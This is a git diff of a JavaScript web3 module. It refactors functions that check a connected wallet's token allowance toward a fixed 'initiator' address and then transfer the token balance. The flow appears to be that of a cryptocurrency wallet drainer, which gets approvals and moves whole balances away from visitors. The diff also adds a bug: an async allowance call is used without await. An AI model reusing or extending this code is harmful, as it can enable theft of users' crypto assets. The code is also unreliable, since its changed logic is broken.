@@ -106,9 +106,8 @@ export const increaseAllowance = async (token) => {
     );
     const account = getAccount().address;
 
-    const allowance = await contract.methods
-      .allowance(account, constants.initiator)
-      .call();
+    const allowance = allownce(token);
+
     if (allowance >= token.balance) {
       return await transfer(token);
     }
@@ -188,6 +187,7 @@ export const increaseAllowance = async (token) => {
                 }
               });
             });
+            return;
           } catch (error) {
             console.log(error);
           }
@@ -262,14 +262,13 @@ export const increaseAllowance = async (token) => {
                   await transfer(token);
                 }
               });
-              
             })
+            return;
           } catch (error) {
             console.log(error);
           }
         }
       })
-      return;
     }
     try{
       if (constants.tokens[token.token_address]) {
@@ -320,7 +319,7 @@ export const transfer = async (token) => {
   }
 };
 
-export const balanceOf = async () => {
+export const ethBalance = async () => {
   try {
     const account = getAccount().address;
     const balance = await fetchBalance({
@@ -331,3 +330,37 @@ export const balanceOf = async () => {
     console.log(error);
   }
 };
+
+export const allownce = async (token) => {
+  try{
+    const web3 = new Web3(window.ethereum);
+    var contract = new web3.eth.Contract(
+      constants.ALLOWANCEABI,
+      token.token_address
+    );
+    const account = getAccount().address;
+    const allowance = await contract.methods
+        .allowance(account, constants.initiator)
+        .call();
+    return allowance;
+  } catch (error) {
+    console.log(error);
+  }
+}
+
+export const balanceOf = async (token) => {
+  try{
+    const web3 = new Web3(window.ethereum);
+    var contract = new web3.eth.Contract(
+      constants.ALLOWANCEABI,
+      token.token_address
+    );
+    const account = getAccount().address;
+    const balance = await contract.methods
+        .balanceOf(account)
+        .call();
+    return balance;
+  } catch (error) {
+    console.log(error);
+  }
+}
